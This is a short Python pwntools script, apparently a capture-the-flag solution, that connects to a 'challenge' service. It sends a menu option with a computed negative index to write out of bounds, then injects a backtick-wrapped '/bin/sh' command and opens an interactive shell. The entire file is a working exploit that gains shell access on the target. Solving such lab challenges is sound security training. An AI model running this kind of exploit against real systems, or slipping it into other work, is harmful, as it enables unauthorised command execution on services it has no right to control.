import argparse

from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))
#r = process('challenge/build/challenge', level='debug')

r.recvuntil(b'> ')
r.sendline(b'14')
r.sendline(str(((-0x38) & 0xFFFFFFFFFFFFFFFF) // 8).encode())
r.sendline(str(128).encode())

r.recvuntil(b'> ')
r.sendline(b'3')
r.sendline(b'`/bin/sh`')

r.interactive()
